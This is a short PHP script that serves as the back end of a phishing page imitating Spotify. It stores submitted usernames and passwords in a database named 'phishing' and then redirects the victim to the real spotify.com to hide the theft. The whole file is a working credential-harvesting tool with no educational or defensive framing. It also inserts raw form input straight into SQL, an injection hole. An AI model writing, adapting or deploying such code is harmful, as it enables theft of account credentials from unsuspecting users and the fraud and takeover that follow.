<?php
$server = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($server, $username, $password, $dbname);

if (!$con) {
    echo "Connection failed";
}

$name = $_POST['username'];
$pass = $_POST['password'];

$sql = "INSERT INTO `spotify`(`username`, `password`) VALUES ('$name','$pass')";
$result = mysqli_query($con, $sql);
if ($result) {
    header('Location: https://spotify.com');
} else {
    echo "Data not inserted";
}
